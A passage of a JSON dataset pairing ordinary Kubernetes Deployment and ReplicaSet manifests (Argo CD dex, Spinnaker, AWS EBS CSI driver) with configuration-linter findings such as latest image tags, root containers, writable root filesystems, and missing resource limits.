    "id": "7259",
    "manifest_path": "data/manifests/the_stack_sample/sample_2654.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mars-mission1\n  labels:\n    app: mars-mission1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mars-mission1\n  template:\n    metadata:\n      labels:\n        identity_template: 'true'\n        app: mars-mission1\n    spec:\n      containers:\n      - name: mars-mission1-main\n        image: us.gcr.io/scytale-registry/aws-cli:latest\n        command:\n        - sleep\n        args:\n        - '1000000000'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mars-mission1-main\" has memory limit 0"
  },
  {
    "id": "7260",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"copyutil\" is using an invalid container image, \"argoproj/argocd:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7261",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"copyutil\" does not have a read-only root file system"
  },
  {
    "id": "7262",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dex\" does not have a read-only root file system"
  },
  {
    "id": "7263",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"argocd-dex-server\" not found"
  },
  {
    "id": "7264",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"copyutil\" is not set to runAsNonRoot"
  },
  {
    "id": "7265",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dex\" is not set to runAsNonRoot"
  },
  {
    "id": "7266",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"copyutil\" has cpu request 0"
  },
  {
    "id": "7267",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dex\" has cpu request 0"
  },
  {
    "id": "7268",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"copyutil\" has memory limit 0"
  },
  {
    "id": "7269",
    "manifest_path": "data/manifests/the_stack_sample/sample_2655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: argocd-dex-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/component: dex-server\n  name: argocd-dex-server\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-dex-server\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-dex-server\n    spec:\n      serviceAccountName: argocd-dex-server\n      initContainers:\n      - name: copyutil\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        command:\n        - cp\n        - -n\n        - /usr/local/bin/argocd-util\n        - /shared\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      containers:\n      - name: dex\n        image: quay.io/dexidp/dex:v2.23.0\n        imagePullPolicy: Always\n        command:\n        - /shared/argocd-util\n        - rundex\n        ports:\n        - containerPort: 5556\n        - containerPort: 5557\n        - containerPort: 5558\n        volumeMounts:\n        - mountPath: /shared\n          name: static-files\n      volumes:\n      - emptyDir: {}\n        name: static-files\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dex\" has memory limit 0"
  },
  {
    "id": "7270",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"spez\" is using an invalid container image, \"gcr.io/$PROJECT_ID/spinnaker-spez\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7271",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7272",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"spez\" does not have a read-only root file system"
  },
  {
    "id": "7273",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"spez\" is not set to runAsNonRoot"
  },
  {
    "id": "7274",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"spez\" has cpu request 0"
  },
  {
    "id": "7275",
    "manifest_path": "data/manifests/the_stack_sample/sample_2657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  annotations:\n    traffic.spinnaker.io/load-balancers: '[\"service spez-service\"]'\n  labels:\n    app: spez\n  name: spez-frontend\n  namespace: spez-staging\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: spez\n  template:\n    metadata:\n      labels:\n        app: spez\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/spinnaker-spez\n        name: spez\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"spez\" has memory limit 0"
  },
  {
    "id": "7276",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7277",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-attacher\" does not have a read-only root file system"
  },
  {
    "id": "7278",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "7279",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
